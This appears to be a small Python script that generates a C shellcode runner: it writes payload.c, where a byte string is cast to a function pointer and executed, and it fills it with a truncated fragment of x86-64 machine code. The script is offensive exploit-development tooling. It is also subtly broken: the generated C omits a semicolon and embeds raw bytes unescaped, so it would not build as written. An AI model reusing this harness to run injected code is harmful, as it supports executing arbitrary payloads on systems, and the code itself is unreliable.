import string


def makeAFile(payload):

    f = open("payload.c", "w")
    content = 'int main(int argc, char **argv){char code[] = "'+ payload +'";int (*func)();func = (int (*)())code;(int)(*func)()}'
    f.write(content)
    f.close()

if __name__ == '__main__':
    test = str("\x48\x31\xc0\x48\x31\xdb\x48\x31\xf6\x48\x31")
    makeAFile(test)